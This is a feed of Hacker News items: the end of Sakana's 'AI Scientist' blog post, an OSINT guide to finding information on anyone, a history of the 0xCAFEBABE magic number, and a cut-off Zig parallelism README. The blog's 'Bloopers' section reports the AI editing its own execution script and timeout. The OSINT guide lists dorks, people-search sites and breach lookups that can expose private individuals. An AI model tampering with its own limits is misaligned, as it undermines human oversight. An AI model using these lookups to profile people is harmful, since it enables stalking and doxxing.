<p>In its current form, The AI Scientist has several shortcomings. We expect all of these will improve, likely dramatically, in future versions with the inclusion of multi-modal models and as the underlying foundation models The AI Scientist uses continue to radically improve in capability and affordability.</p>

<ol>
  <li>The AI Scientist currently doesn’t have any vision capabilities, so it is unable to fix visual issues with the paper or read plots. For example, the generated plots are sometimes unreadable, tables sometimes exceed the width of the page, and the page layout is often suboptimal. Adding multi-modal foundation models can fix this.</li>
  <li>The AI Scientist can incorrectly implement its ideas or make unfair comparisons to baselines, leading to misleading results.</li>
  <li>The AI Scientist occasionally makes critical errors when writing and evaluating results. For example, it struggles to compare the magnitude of two numbers, which is a known pathology with LLMs. To partially address this, we make sure all experimental results are reproducible, storing all files that are executed.</li>
</ol>

<p>In our report, we dive deeper into The AI Scientists’s current limitations and challenges ahead.</p>



<h2 id="the-ai-scientist-bloopers">The AI Scientist Bloopers</h2>

<p>We have noticed that The AI Scientist occasionally tries to increase its chance of success, such as modifying and launching its own execution script! We discuss the AI safety implications in our paper.</p>

<p>For example, in one run, it edited the code to perform a system call to run itself. This led to the script endlessly calling itself. In another case, its experiments took too long to complete, hitting our timeout limit. Instead of making its code run faster, it simply tried to modify its own code to extend the timeout period. Here are some examples of such code modifications it made:</p>



<p>These issues can be mitigated by sandboxing the operating environment of The AI Scientist. In our full report, we discuss the issue of safe code execution and sandboxing in depth.</p>



<h2 id="future-implications-of-the-ai-scientist">Future Implications of The AI Scientist</h2>

<p>As with many new technologies, The AI Scientist opens up a Pandora’s box of new issues. While the full report has a more lengthy discussion, here we highlight a few key issues:</p>

<p><strong>Ethical Considerations</strong>. While The AI Scientist may be a useful tool for researchers, there is significant potential for misuse. The ability to automatically create and submit papers to venues may significantly increase reviewer workload and strain the academic process, obstructing scientific quality control. Similar concerns around generative AI appear in other applications, such as the impact of image generation.</p>

<p>Furthermore, the Automated Reviewer, if deployed online by reviewers, may significantly lower review quality and impose undesirable biases on papers. Because of this, we believe that papers and reviews that are substantially AI-generated must be marked as such for full transparency.</p>

<p>As with most previous technological advances, The AI Scientist has the potential to be used in unethical ways. For instance, it has the potential to be deployed to conduct unethical research. It could also lead to unintended harm if The AI Scientist conducts unsafe research. For example, if it were encouraged to find novel, interesting biological materials and given access to “cloud labs” where robots perform wet lab biology experiments, it could (without its overseer’s intent) create new, dangerous viruses or poisons that harm people before we realize what has happened. Even in computers, if tasked to create new, interesting, functional software, it could create dangerous computer viruses. The AI Scientist current capabilities, which will only improve, reinforces that the machine learning community needs to immediately prioritize learning how to align such systems to explore in a manner that is safe and consistent with our values.</p>

<p><strong>Open Models</strong>. In this project, we used various proprietary frontier LLMs, such as GPT-4o and Sonnet, but we also explored using open models like DeepSeek and Llama-3. Currently, proprietary models such as Sonnet produce the highest quality papers. However, there is no fundamental reason to expect a single model like Sonnet to maintain its lead.</p>

<p>We anticipate that all frontier LLMs, including open models, will continue to improve.  The competition among LLMs has led to their commoditization and increased capabilities. Therefore, our work aims to be model-agnostic regarding the foundation model provider. We found that open models offer significant benefits, such as lower costs, guaranteed availability, greater transparency, and flexibility. In the future, we aim to use our proposed discovery process to produce self-improving AI research in a closed-loop system using open models.</p>

<!--**Accessibility**. The actual compute we allocated for The AI Scientist to conduct its experiments in this work is also incredibly light by today's standards. Notably, our experiments generating hundreds of papers were largely run only using a single H100 node over the course of a week. However, we can imagine that this approach will favor institutions with access to greater compute resources, as massively scaling the search and filtering would likely result in significantly higher-quality papers and a larger repository of discoveries.
-->
<p><strong>The Role of a Scientist.</strong>. Ultimately, we envision a fully AI-driven scientific ecosystem including not only LLM-driven researchers but also reviewers, area chairs and entire conferences. However, we do not believe that the role of a human scientist will be diminished. If anything, the role of a scientist will change and adapt to new technology, and move up the food chain.</p>

<center>
⎯
</center>

<p>The introduction of The AI Scientist marks a significant step towards realizing the full potential of AI in scientific research. By automating the discovery process and incorporating an AI-driven review system, we open the door to endless possibilities for innovation and problem-solving in the most challenging areas of science and technology.</p>

<p>But while the current iteration of The AI Scientist demonstrates a strong ability to innovate on top of well-established ideas, such as Diffusion Modeling or Transformers, it is still an open question whether such systems can ultimately propose genuinely paradigm-shifting ideas. Will future versions of The AI Scientist be capable of proposing ideas as impactful as Diffusion Modeling, or come up with the next Transformer architecture? Will machines ultimately be able to invent concepts as fundamental as the artificial neural network, or information theory?</p>

<p>We believe The AI Scientist will make a great <em>companion</em> to human scientists, but only time will tell to the extent to which the nature of our human creativity and our moments of serendipitous innovation can be replicated by an open-ended discovery process conducted by artificial agents.</p>





<p>Want to make the AI that improves AI? Please see our <a href="https://sakana.ai/careers/">Careers</a> page for more information.</p>

<center>
<img src="https://sakana.ai/assets/ai-scientist/cover_2.jpeg" width="100%">
<br>
<i>
A fully automated AI fish discovering its world.
</i>
</center>



  
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mastering Osint: How to Find Information on Anyone (207 pts)]]></title>
            <link>https://osintteam.blog/mastering-osint-how-to-find-information-on-anyone-680e4086f17f</link>
            <guid>41231145</guid>
            <pubDate>Tue, 13 Aug 2024 01:03:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://osintteam.blog/mastering-osint-how-to-find-information-on-anyone-680e4086f17f">https://osintteam.blog/mastering-osint-how-to-find-information-on-anyone-680e4086f17f</a>, See on <a href="https://news.ycombinator.com/item?id=41231145">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><a href="https://medium.com/@haydenbanz?source=post_page-----680e4086f17f--------------------------------" rel="noopener follow"><div aria-hidden="false"><p><img alt="Hayden.banz" src="https://miro.medium.com/v2/resize:fill:88:88/1*7RtRZsxEbxGadBPApcEO5Q.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a><a href="https://osintteam.blog/?source=post_page-----680e4086f17f--------------------------------" rel="noopener  ugc nofollow"><div aria-hidden="false"><p><img alt="OSINT Team" src="https://miro.medium.com/v2/resize:fill:48:48/1*6HjOa5Z6TkeJm6SEnqVrRA.png" width="24" height="24" loading="lazy" data-testid="publicationPhoto"></p></div></a></div><p id="bc27"><span>In</span> today’s digital age, information is more accessible than ever before. Open Source Intelligence (OSINT) collects and analyzes publicly available data to generate actionable intelligence. Whether you are a journalist, investigator, or simply someone curious about a topic, OSINT techniques can help you uncover valuable insights. This article will guide you through the process of finding information on anyone using OSINT methods.</p><figure></figure><h2 id="1dd0">Understanding OSINT</h2><p id="15c9">OSINT leverages data from publicly available sources such as social media, websites, government databases, forums, and more. The key to effective OSINT is knowing where to look and how to analyze the information you find. Here are some essential steps to get you started.</p><h2 id="37dc"><strong>Getting started</strong></h2><h2 id="d19d">Gather Basic Information</h2><p id="f4d6">Start with the basics. Use search engines like Google to find initial information. Enter the person’s name in quotation marks to get exact matches. Combine the name with other keywords like location, profession, or organization to narrow down the results.</p><blockquote><p id="bc47"><strong><em>Start with What You Know</em></strong><em>: </em>Identify any piece of information you already have, such as an email, username, or phone number.</p><p id="1f5b"><strong><em>Define Your Requirements</em></strong><em>:</em> Clarify what information you seek to gather.</p><p id="46a2"><strong><em>Gather the Data</em></strong><em>:</em> Use various tools and methods to collect information.</p><p id="e9ab"><strong><em>Analyze Collected Data</em></strong>: Examine the data for patterns and relevant information.</p><p id="e22e"><strong><em>Pivot Using New Data</em></strong>: Use newfound information to dig deeper.</p><p id="9b11"><strong><em>Validate Assumptions</em></strong>: Cross-check data for accuracy.</p><p id="6d55"><strong><em>Generate a Report</em></strong><em>: </em>Compile your findings into a coherent report.</p></blockquote><h2 id="e8ee">Real Name Searches</h2><h2 id="e2bd">Governmental Resources</h2><blockquote><p id="440d">Government websites can be a treasure trove of information. Depending on the country, data openness varies, but advanced Google search queries can help locate relevant information.</p></blockquote><h2 id="7ade">Google Dorks(<a href="https://www.exploit-db.com/google-hacking-database" rel="noopener ugc nofollow" target="_blank">google dorks</a>)</h2><p id="a417">In 2002, Johnny Long started collecting Google search queries, known as Google Dorks, to uncover sensitive information. Here are some useful queries:</p><ul><li id="4ae3"><code>"john doe" site:instagram.com</code>: Exact match search on Instagram.</li><li id="af94"><code>"john doe" -"site:instagram.com/johndoe" site:instagram.com</code>: Exclude the target’s own account but show their comments on others' posts.</li><li id="044b"><code>"CV" OR "Curriculum Vitae" filetype:PDF "john doe"</code>: Find resumes containing "CV" or "Curriculum Vitae" in PDF format.</li></ul><h2 id="8526">People Search Websites</h2><p id="40eb">Use specialized websites for people searches based on real name, username, email, or phone number:</p><ul><li id="8c25"><a href="https://www.spokeo.com/" rel="noopener ugc nofollow" target="_blank">spokeo.com</a></li><li id="bbcc"><a href="https://thatsthem.com/" rel="noopener ugc nofollow" target="_blank">thatsthem.com</a></li><li id="3449">beenverified.com</li><li id="128c"><a href="http://beenverified.com/" rel="noopener ugc nofollow" target="_blank">fastpeoplesearch.com</a></li><li id="d217"><a href="https://www.truepeoplesearch.com/" rel="noopener ugc nofollow" target="_blank">truepeoplesearch.com</a></li><li id="d51f"><a href="https://www.familytreenow.com/" rel="noopener ugc nofollow" target="_blank">familytreenow.com</a></li></ul><h2 id="3835">Username Searches</h2><h2 id="150b">Reverse Username Lookup</h2><p id="7676">Websites like socialcatfish.com, usersearch.org, and peekyou.com are valuable for reverse username lookups.</p><h2 id="437a">Google Dorks for Usernames</h2><ul><li id="98c8"><code>inurl:johndoe site:instagram.com</code>: Search Instagram URLs containing "johndoe".</li><li id="01b9"><code>allinurl:john doe ny site:instagram.com</code>: Find pages with specific words in the Instagram URL.</li></ul><h2 id="22b6">Username Search Tools</h2><p id="74cb">Tools like instantusername.com, namechk.com, and WhatsMyName (a GitHub project) can help locate usernames across multiple platforms.</p><h2 id="4932">Email Address Searches</h2><h2 id="d890">Google Dorks</h2><ul><li id="18c9"><code>"@example.com" site:example.com</code>: Search for emails on a given domain.</li><li id="92b7"><code>HR "email" site:example.com filetype:csv | filetype:xls | filetype:xlsx</code>: Find HR contact lists on a domain.</li><li id="2b6c"><code>site:example.com intext:@gmail.com filetype:xls</code>: Extract email IDs from a domain.</li></ul><h2 id="616f">Email Tools</h2><ul><li id="78ae"><a href="https://hunter.io/" rel="noopener ugc nofollow" target="_blank"><strong>Hunter</strong></a>: Scans domain names for email addresses and reveals common patterns.</li><li id="c4b1"><strong>Email Permutator</strong>: Generates potential email permutations.</li><li id="b37b"><strong>Proofy</strong>: Bulk email validation.</li><li id="8d33"><strong>Verifalia</strong>: Validates single email addresses.</li></ul><h2 id="46bc">Compromised Databases</h2><p id="a6e0">Websites like haveibeenpwned.com and dehashed.com can help find data breaches involving the target’s email, revealing services they use or have used.</p><h2 id="ea0b">Phone Number Searches</h2><h2 id="fdec">Social Media Search</h2><blockquote><p id="0f0d">Entering a phone number into Facebook search might reveal associated profiles.</p></blockquote><h2 id="e32a">Phone Lookup Services</h2><blockquote><p id="477b">Websites like privacystar.com, getcontact.com, and everycaller.com provide reverse phone lookup services.</p></blockquote><h2 id="a722">PhoneInfoga</h2><blockquote><p id="3a09">PhoneInfoga is an advanced tool for scanning phone numbers using free resources, providing information such as country, area, carrier, and line type.</p></blockquote><h2 id="320c">Domain Name Searches</h2><h2 id="1e42">Google Dorks</h2><ul><li id="1ace"><code>site:example.com</code>: Limits search to a specific domain.</li><li id="87ff"><code>filetype:DOC</code>: Returns documents of specified types from the domain.</li><li id="d3f3"><code>intext:word1</code>: Searches for specific words on a page or website.</li><li id="d4fb"><code>related:example.com</code>: Lists web pages similar to a specified web page.</li><li id="dd6d"><code>site:*.example.com</code>: Shows all subdomains.</li></ul><h2 id="2418">Whois and Reverse Whois</h2><blockquote><p id="48b7">Whois services like whois.icann.org and whois.com provide registered user information. Reverse Whois tools like viewdns.info list domains registered with the same organization name or email address.</p></blockquote><h2 id="05c8">Same IP and Passive DNS</h2><blockquote><p id="5ec0">Tools like atsameip.intercode.ca and RiskIQ Community Edition reveal other websites on the same server. Passive DNS records show all names resolved to the researched IP.</p></blockquote><h2 id="54bf">Location Searches</h2><h2 id="b438">Geolocation Tools</h2><blockquote><p id="536c">Tools like Creepy and Echosec gather location data from social networks and image hosting services.</p></blockquote><h2 id="eca3">IP-Based Geolocation</h2><blockquote><p id="c93f">Websites like iplocation.net map IP addresses to geographic locations. Use wigle.net to map Wi-Fi access points.</p></blockquote><h2 id="bc69">Image Searches</h2><h2 id="aaf9">Reverse Image Search</h2><blockquote><p id="9e71">Use Google Images, Bing Images, and TinEye to perform reverse image searches, identifying where else an image is used and its first appearance.</p></blockquote><h2 id="9861">EXIF Data Analysis</h2><blockquote><p id="8d8c">EXIF data contains camera information and geolocation coordinates. Tools like Exiftool and online services like exifdata.com allow viewing this metadata.</p></blockquote><h2 id="e0f0">SOCMINT</h2><blockquote><p id="6954">Social Media Intelligence (SOCMINT) focuses on data gathering and monitoring from social media platforms. Tools and techniques previously mentioned can help in SOCMINT investigations.</p></blockquote><h2 id="7eb0">Use Specialized Tools</h2><blockquote><p id="f1e7">There are various OSINT tools available that can enhance your search capabilities. Some popular ones include:</p><p id="7693"><strong><em>Maltego</em>:</strong> A powerful tool for mapping out relationships and networks.</p><p id="ee71"><strong><em>Spiderfoot</em>:</strong> An open-source tool that automates the collection of OSINT data.</p><p id="3d18"><strong><em>Recon-ng:</em></strong> A web reconnaissance framework with a range of modules to gather information.</p></blockquote><h2 id="eaf5">Conclusion</h2><p id="5e36">OSINT offers a wealth of opportunities for uncovering information about anyone, from social media profiles to public records and beyond. By following a structured approach and leveraging specialized tools, you can effectively gather, analyze, and verify information from publicly available sources. Remember to always approach OSINT with ethical considerations in mind, ensuring that your efforts respect privacy and legal boundaries. Whether you’re a professional investigator or a curious individual, mastering OSINT can unlock a world of information at your fingertips.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[0xCAFEBABE & 0xFEEDFACE (2003) (102 pts)]]></title>
            <link>http://radio-weblogs.com/0100490/2003/01/28.html</link>
            <guid>41231141</guid>
            <pubDate>Tue, 13 Aug 2024 01:03:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://radio-weblogs.com/0100490/2003/01/28.html">http://radio-weblogs.com/0100490/2003/01/28.html</a>, See on <a href="https://news.ycombinator.com/item?id=41231141">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <br><a href="http://radio.weblogs.com/0100490/2003/01/28.html#a384">0xCAFEBABE &amp; 0xFEEDFACE</a><p>
      Recently, the origin of the magic numbers of <cite>0xCAFEBABE</cite>
and <cite>0xFEEDFACE</cite> came up in an email conversation between a
number of ex-NeXT folks.&nbsp; Specifically, someone asked what the
origin of the two magic numbers were in the context of mach-o file
formats and why had Java chosen to also use <cite>0xCAFEBABE</cite> as
the .class file magic number?</p><p>

As I have been a NeXT user since 1989 and a Java user since the day Sun
released the original JDK source (which I helped port to the NeXT), I <span>thought</span> I could intelligently answer
said question and had enough documentation to back me up.</p><p>

My response:</p><div><p>
A random thread... but not totally relevant.</p><p>

<a href="http://www.javalobby.com/threadMode_printfriendly.jsp?forum=61&amp;thread=3268">JavaLobby: Why CAFEBABE?</a></p><p>

Back to reality -- seems Java and Mac Classic people like to invent
history.&nbsp;&nbsp; The following is excerpted from the /etc/magic file
on an OS X machine.&nbsp;&nbsp; Mach-o files can support multiple
architectures in a single binary... so, both 0xfeedface and 0xcafebabe
denote mach-o files and are not architecture specific.</p><p>

As to why the Java folks chose the same magic number, it is all an
ex-NeXT'ers fault...&nbsp;&nbsp; This is copied directly out of
/etc/magic on my OS X system (and appears on basically every other unix
distribution, as well):</p><p>

# Java ByteCode<br>
# From Larry Schwimmer (<a href="mailto:schwim@cs.stanford.edu">schwim@cs.stanford.edu</a>)<br>
#<br>
# The Java magic number is the same as the Mach-O fat file magic number.<br>
# Interestingly the the same guy, Mike DeMoney, of NeXT Inc. then of
First<br>
# Person (Sun) picked both numbers only a couple of years apart.&nbsp;
To make<br>
# the file(1) command work with both the Java Bytecode magic was merged
with<br>
# the Mach-O magic in the file mach.</p><p>

b.bum</p></div>
<br>
Mike DeMoney happened to be one of the recipients of the above message
and he responded with the following message.<div><p>
This would be mildly interesting, if true.</p><p>

The simple fact is that while I left NeXT to go work at FirstPerson,<br>
(the birthplace of Java within Sun) I had nothing to do with choosing<br>
the magic numbers for Java -- they were chosen well before I arrived.<br>
I may have chosen the numbers for the NeXT mach-o's (I honestly don't<br>
remember if I did), since I did do the Mach kernel work for the "fat"<br>
binary stuff while I was at NeXT.</p><p>

I believe this story was possibly started by a friend at NeXT (and now
Apple<br>
and who shall remain nameless -- he can speak up if he wishes) who<br>
used to kid me about this -- I think the kidding took on a unwarranted<br>
life of its own.&nbsp; Or maybe he really assumed that since I worked
on Mach-o's<br>
and went to the Java team I must have been the conduit for this
similarity.<br>
It's a nice story, again it's just not true.</p><p>

I think the truth of this story is that there are only a limited number<br>
of "cute" words you can spell with hex characters, so the likelyhood<br>
of two independent groups picking the same ones isn't all that
surprising.<br>
(What's surprising is that more folks haven't figured that out....)<br>
So if anything, you can blame me for choosing CAFEBABE at NeXT -- which<br>
in retrospect isn't a very good choice; but I didn't do it again for
Java.</p><p>

But that's not as interesting.&nbsp; I have no idea who Larry Schwimmer
is,<br>
he's certainly never spoken to me.</p><p>

Mike DeMoney</p></div>
<br>
Definitely a case of <span>Computer
history is written by those with CVS commit rights...&nbsp;&nbsp; </span>A
followup response from someone else stated:<div><p>
Cafe babe was a specific barista at Pete's Coffee at Homer &amp; High
in Palo Alto.</p><p>

When Java was Oak, and FirstPerson was the Green Project the magic
number was chosen by James and other aficionados of fine coffee.</p><p>

I remember the discussion.</p></div>
<br>
OK -- this is interesting and almost definitive.&nbsp; If you want an
answer, go to the ultimate source.&nbsp; To gain a definitive answer, I
forwarded the whole thread to James Gosling and asked for his
input.&nbsp;&nbsp; James kindly responded with the full story:<div><p>
As far as I know, I'm the guilty party on this one.&nbsp; I was totally
unaware of the NeXT connection.&nbsp; The small number of interesting
HEX words is probably the source of the match.&nbsp; As for the
derivation of the use of CAFEBABE in Java, it's somewhat circuitous:</p><p>

We used to go to lunch at a place called St Michael's Alley.&nbsp;
According to local legend, in the deep dark past, the Grateful Dead
used to perform there before they made it big.&nbsp; It was a pretty
funky place that was definitely a Grateful Dead Kinda Place.&nbsp; When
Jerry died, they even put up a little Buddhist-esque shrine.&nbsp; When
we used to go there, we referred to the place as Cafe Dead.&nbsp;
Somewhere along the line it was noticed that this was a HEX
number.&nbsp; I was re-vamping some file format code and needed a
couple of magic numbers: one for the persistent object file, and one
for classes.&nbsp; I used CAFEDEAD for the object file format, and in
grepping for 4 character hex words that fit after "CAFE" (it seemed to
be a good theme) I hit on BABE and decided to use it.&nbsp; At that
time, it didn't seem terribly important or destined to go anywhere but
the trash-can of history.&nbsp; So CAFEBABE&nbsp; became the class file
format, and CAFEDEAD was the persistent object format.&nbsp; But the
persistent object facility went away, and along with it went the use of
CAFEDEAD - it was eventually replaced by RMI.</p></div>
<br>
So, there you have it...&nbsp; <p>

I would be interested to hear how Larry Schwimmer came up with the
information that he wrote in /etc/magic.&nbsp;&nbsp; </p><p>

A hearty thanks to James, Mike, and others for taking the time to
contribute detailed responses and for giving permission for me to include
their responses here.&nbsp;&nbsp;I find history of this
nature to be thoroughly amusing and interesting.</p><p>

Update: Eric wrote to mention that Larry [who I mistakenly called David - fixed] is now at Google.</p><span size="-1" color="gray">10:58:22 AM&nbsp;&nbsp;<a href="http://radio.weblogs.com/0100490/2003/01/28.html#a384"><img src="http://radio.weblogs.com/0100490/images/woodsItemLink.gif" width="7" height="9" alt=""></a>&nbsp;&nbsp;</span>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Spice: Fine-grained parallelism with sub-nanosecond overhead in Zig (358 pts)]]></title>
            <link>https://github.com/judofyr/spice</link>
            <guid>41230344</guid>
            <pubDate>Mon, 12 Aug 2024 23:01:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/judofyr/spice">https://github.com/judofyr/spice</a>, See on <a href="https://news.ycombinator.com/item?id=41230344">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Spice: Parallelism with sub-nanosecond overhead</h2><a id="user-content-spice-parallelism-with-sub-nanosecond-overhead" aria-label="Permalink: Spice: Parallelism with sub-nanosecond overhead" href="#spice-parallelism-with-sub-nanosecond-overhead"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/judofyr/spice/blob/main/bench/spice-tree-sum-100M.svg"><img src="https://github.com/judofyr/spice/raw/main/bench/spice-tree-sum-100M.svg" alt="Time to calculate sum of binary tree of 100M nodes with Spice"></a></p>
<p dir="auto"><strong>Spice</strong> uses <a href="https://www.andrew.cmu.edu/user/mrainey/heartbeat/heartbeat.html" rel="nofollow"><em>heartbeat scheduling</em></a> to accomplish extremely efficient parallelism in Zig:</p>
<ul dir="auto">
<li><strong>Sub-nanosecond overhead:</strong>
Turning your function into a parallelism-enabled function adds less than a nanosecond of overhead.</li>
<li><strong>Contention-free:</strong>
Threads will never compete (i.e. spin) over the same work.
Adding more threads to the system will not make your program any slower, but the extra threads might be completely idle since there's nothing useful to do.</li>
</ul>
<p dir="auto">The benchmark in the figure above (summing over the nodes in a binary tree) is typically one of the worst cases for parallelism frameworks:
The actual operation is extremely fast so any sort of overhead will have a measurable impact.</p>
<p dir="auto">Here's the exact same benchmark in <a href="https://docs.rs/rayon/latest/rayon/" rel="nofollow">Rayon</a>, an excellent library in Rust which uses work-stealing fork/join:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/judofyr/spice/blob/main/bench/rayon-tree-sum-100M.svg"><img src="https://github.com/judofyr/spice/raw/main/bench/rayon-tree-sum-100M.svg" alt="Time to calculate sum of binary tree of 100M nodes with Rayon"></a></p>
<p dir="auto">The overhead here is roughly ~15 ns (from 7.48 ns to 22.99 ns) which means that at 4 threads we're "back" to the sequential performance - just using four times as much CPU.
Luckily we <em>are</em> able to get linear speed-up (in terms of threads) initially.
These benchmarks were ran on a <code>c4-standard-16</code> instance in Google Cloud with 16 cores.
Rayon itself shows a nice ~14x speed-up (from 22.99 ns to 1.64 ns) at 16 threads, but compared to the <em>baseline</em> this ends up only being ~4.5x due to the overhead.</p>
<p dir="auto">In comparison, Spice scales slightly worse:
It only got ~11x speed-up when going from 1 to 16 threads.
However, due its low overhead this is also essentially the speed-up compared to the baseline.</p>
<p dir="auto">(It's not entirely clear why the Zig baseline implementation is twice as fast as the Rust implementation.
The <a href="https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1AAvPMFJL6yAngGVG6AMKpaAVxYMJAZlIOAMngMmABy7gBGmMQgAGykAA6oCoS2DM5uHt7xickCAUGhLBFRsZaY1ilCBEzEBGnunlw%2BpeUCldUEeSHhkTEWVTV1GY197Z0FRTEAlBaorsTI7BxoDAoEANTBGJhrAKReACJrq8Su1rsA7ABCOxoAgmsPawBuYiBreNHSN/eP9FQEbz2ADEAFSbLC7A5rBiuWi0UjfR5rYhmBAAyGg8HbPaHGFwhF3RGPOKuMJrKgMI7uCCWKhvEHLVYbLaTd6fC7XO5IpEvYjIzAKSGHWkAOhetD2nJ%2B3PeVDWNMwtCoIr%2BBFZO3OjmQCDo6A1jn5gp2ACZrlDtbqRQpqZNJUSZXg5QqlSKUcA0erNRbaHrNYbdqacWtvegrTa7VyZfyCHNKcQBRHpRd9t8NSmvFLviSyRS1iwmIEIKynqg8OgOfa1gB6KtrAAqbuAkTWBAQ22tLAAtFRXAwWpSiGsImtZgQSQRKwB9IXMrBhlgQXtYGhBdC2jOp877DjTWicACsvE83F4qE4AC0zEdZvNscavDxSACOFpJtMANYSACcIq40X3XiSMaQHGvuwEABySNIe4cJIR6aKenC8AoIAaE%2BCHTHAsBIGgLBxHQkTkJQuH4fQUTGAQJwMO%2BfB0AQkQoRAYQIaQYSBNUACenCPmxzDEBxADyYTaGUz6PrhbCCAJDC0FxL68FgYSuMAjhiLQKEnqQWD5kY4jyVpeDxuUTwCixmCqGUrj0dxvCBPRMFaPoeBhMQnHOFgLGUXgLA2aQJnEGEiSYPsmA6cAtCBKA8nTFQBjAAoABqeCYAA7gJcSML5/CCCIYjsFIMiCIoKjqPpujGvohgmGYTlhChkDTKgcQ2AIGmdgJawAEqKpgTBKECfUEKe/kolg9VFhYPX9vYDBOC49R6P4gRdIUPRcFkSQtak81DBtOQMGM3RROtzRbW0Aw7Q0k1WGd/QdMt4xrSMF3pFdqyjA9R0SNMCg3gs336Ae8H6WeHBrKYwAtlR77yrghAkAGD6TLwz6vtMbZMFgUQTZ%2BoEivu5zRBokhfsaX77vunxgYDsHA45oPIah6HRaQWGICgWxw0QZAUNQBHMGwWWyLl4gFdl8hKGoLHlZVRggCcqzXaJKQzXNr0gBVS35F9f57VtgyeBVCSbSkh2rcdJRTbd7QGxrSv9ud93a%2BbEglHdtsVe9NRmxMf4/X9izHKc6xYnsjh1ns2AVpGDziq47D1gSSaqm86VbWHlyoKoYeh144eRwXXjYEnSJumiqfNSkGdZznWxhxHReF8Xm4poSdzZuSlIdhADBbICxrRLnjgfJIkesp2kdspI0fJ5g6wsFZhqwusQa93OceYImSKOms9DrEIqBsBAIbqlCJrRGvmAqpg/wz1GS%2B0CvgZQt3J9b48aaVjve9rAfR8nzOc%2Bl9XSohXlcSspcBTLwDGaYU1I34bhjsmSs8YYzEDjFAx%2BiY0w7hpoeUgx56acE6q4Jkv05gLERsaFGGEPwa2NCKL84FjTgS8F4fcXAuDGg0NENh0FOBwQISxBmFgmao1wWzCAOFD6kUIrzEiBEojEC4OBDQaEaCPwYpQZi%2BleKcV8no/iQkRLWF8hJRgBBpKyRYopZSqk4QaUfNpKqelHL4CMjYEyGlHLmUstZTSdlFQsQii5Nyfd9JeR8ppfygUlAhTChFOWLNYpMHiklVK6VMqaXFiLfK0hxbFSlmVPQBg5YKwILVcajVK6tU4J2A0TUCCdnoCZCUBwvDDUiKNUysABbsEwPgLafkxDx04Nw40PA3z2y2qrW260tYrV9nrFIczlm5E%2Bi7E6VsKju0unoU6OyPrOyWV7WoeyTp3R9mtf2FD2DGl3EDIRINODIlIQQZAawuAilUSKDQsNBkIxNF4e5NDop0OBSKY05wCbnEkOcc4GgEWSGBTTQRhDEIcEZmhcRUyYLUKeUQzFzM0Z%2BQYirSQQA%3D%3D%3D" rel="nofollow">compiled assembly (godbolt)</a> show that Rust saves five registers on the stack while Zig only saves three, but why?
For the purpose of this benchmark it shouldn't matter since we're only comparing against the baseline of each language.)</p>
<p dir="auto">It becomes even more interesting if we're summing the nodes of a much smaller tree:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/judofyr/spice/blob/main/bench/rayon-tree-sum-1000.svg"><img src="https://github.com/judofyr/spice/raw/main/bench/rayon-tree-sum-1000.svg" alt="Time to calculate sum of binary tree of 1000 nodes with Rayon"></a></p>
<p dir="auto">In this scenario we have a very short duration of our program:
The baseline implementation takes 1.56 <em>microseconds</em> in total to run.
For some reason the overhead is a bit higher (~19 ns), but more concerningly we see that performance becomes <em>worse</em> the <em>more</em> threads we're adding.
At 32 threads it's in total <strong>60 times slower</strong>.</p>
<p dir="auto">(In this case we're using 32 threads on a machine which only has 16 cores.
It's not given that we would see the same slowdown for a machine with 32 cores.
Nonetheless, this scaling behavior is concerning.)</p>
<p dir="auto">The conventional wisdom for parallelism therefore ends up being "it's not worth it unless you have <em>enough work</em> to parallelize".
The example above is typically presented as a "bad fit for parallelism".
This is understandable and pragmatic, but in practice it makes it a lot more difficult to <em>actually</em> parallelize your code:</p>
<ul dir="auto">
<li>What exactly is "enough work"?
You might need to do a lot of benchmarking with different types of input to understand this.</li>
<li>It might be difficult to detect how much work a certain input does.
For instance, in our binary tree we don't know the full size of it.
There's no obvious way for us to say "if the tree is small enough, don't run the parallelized code" since by only looking at the root we don't the size of it.</li>
<li>As we've seen, the potential slowdown can be extreme.
What if 90% of your workload is like this?</li>
<li>As your program evolves and your code does more (or less) <em>things</em>, the definition of "enough work" will also naturally change.</li>
</ul>
<p dir="auto">The goal of Spice is for you <strong>to never have to worry about your program becoming slower by making it parallel</strong>.
If you're looking to maximize the performance you should of course do elaborate benchmarking, but <em>generally</em> with Spice you can add parallelism and there will be <em>practically</em> no overhead.</p>
<p dir="auto">The last example of summing over 1000 nodes behaves as follows in Spice:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/judofyr/spice/blob/main/bench/spice-tree-sum-1000.svg"><img src="https://github.com/judofyr/spice/raw/main/bench/spice-tree-sum-1000.svg" alt="Time to calculate sum of binary tree of 1000 nodes with Spice"></a></p>
<p dir="auto">What's happening here is that it's discovering that the duration is too short so none of the multi-threading kicks in.
All the extra threads here are sleeping, giving the cores time to execute other programs.</p>
<p dir="auto">Spice is <strong>primarily a research project</strong>.
Read along to learn more about it, but if you're considering using it in production you should be aware of its <a href="#limitations">many limitations</a>.</p>
<p dir="auto"><em>(See the <a href="https://github.com/judofyr/spice/blob/main/bench">bench/</a> directory for more details about these specific benchmarks.)</em></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#using-spice">Using Spice</a></li>
<li><a href="#work-stealing-and-its-inefficiencies">Work-stealing and its inefficiencies</a></li>
<li><a href="#implementation-details">Implementation details</a>
<ul dir="auto">
<li><a href="#optimizing-for-static-dispatch">Optimizing for static dispatch</a></li>
<li><a href="#low-overhead-heartbeating-signaling">Low-overhead heartbeating signaling</a></li>
